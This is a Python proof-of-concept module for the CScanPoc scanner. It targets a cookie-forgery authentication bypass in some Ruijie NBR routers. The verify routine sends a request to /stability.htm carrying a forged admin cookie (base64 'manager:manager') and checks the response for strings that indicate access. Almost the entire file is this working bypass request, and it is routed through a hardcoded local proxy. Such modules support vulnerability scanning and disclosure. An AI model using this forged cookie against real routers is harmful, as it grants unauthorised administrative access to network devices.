# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Ruijie_0001'  # 平台漏洞编号，留空
    name = '锐捷网络NBR部分路由器 cookie欺骗'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-10-22'  # 漏洞公布时间
    desc = '''
        锐捷网络NBR部分路由器cookie欺骗权限绕过。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0148657'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '锐捷网络'  # 漏洞应用名称
    product_version = 'NBR路由器'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ab03e5fb-de2c-4ea9-9e03-b5ca17e584e0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref: http://www.wooyun.org/bugs/wooyun-2010-0148657
            hh = hackhttp.hackhttp()
            url = self.target + '/stability.htm'
            cookie = 'currentURL=index; auth=bWFuYWdlcjptYW5hZ2Vy; user=manager; c_name='
            code, head, res, errcode, _ = hh.http(
                url, cookie=cookie, proxy=('127.0.0.1', 8080))
            if code == 200 and 'A_INTFEMPTY' in res and 'selectInterface' in res:
                #security_hole('Cookie deception:http://www.wooyun.org/bugs/wooyun-2010-0148657 cookie:%s'%cookie)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
